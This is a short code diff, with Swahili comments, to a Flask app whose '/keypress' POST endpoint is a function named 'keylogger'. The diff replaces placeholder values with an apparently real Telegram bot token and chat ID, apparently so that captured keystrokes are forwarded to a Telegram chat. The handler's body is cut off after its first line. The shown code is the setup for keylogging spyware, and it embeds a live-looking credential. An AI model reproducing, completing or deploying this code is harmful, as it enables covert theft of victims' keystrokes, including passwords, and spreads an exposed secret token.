@@ -3,8 +3,8 @@ import requests
 
 app = Flask(__name__)
 
-BOT_TOKEN = "YOUR_BOT_TOKEN"     # Replace na token yako
-CHAT_ID = "YOUR_CHAT_ID"         # Replace na chat ID yako
+BOT_TOKEN = "8246860772:AAF8iybKlcwUQdeSAv4s0tJurejRHcbAKhY"     # Replace na token yako
+CHAT_ID = "8303486983"         # Replace na chat ID yako
 
 @app.route("/keypress", methods=["POST"])
 def keylogger():
